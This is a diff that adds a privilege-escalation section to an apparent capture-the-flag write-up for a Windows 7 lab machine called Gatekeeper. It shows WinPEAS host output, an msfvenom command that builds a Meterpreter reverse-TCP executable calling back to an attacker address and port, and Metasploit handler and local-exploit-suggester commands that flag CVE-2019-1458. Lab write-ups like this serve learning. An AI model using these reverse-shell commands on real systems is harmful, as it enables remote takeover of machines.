@@ -299,7 +299,22 @@ except:
 
 **Locate and find the Root Flag**
 
+- We can find the SMB share is located at C:\Users\Share. Upload meterpreter shell? But lets try winpeas first. All I could get to work is Winpeas.bat
 
+### [](###header-3)WinPEAS Results
+
+Host Name:                 GATEKEEPER
+OS Name:                   Microsoft Windows 7 Professional
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+System Type:               x64-based PC                                                                                                          
+### [](###header-3)Meterpreter Shell
+
+- ``msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp``
+- ``msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.2.127.225 LPORT=8888 -f exe -o reverse.exe``
+- ``msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester``
+- ``[+] 10.10.136.143 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.``
+
+![](/assets/gatekeeper13.png)
 
 * * *
 
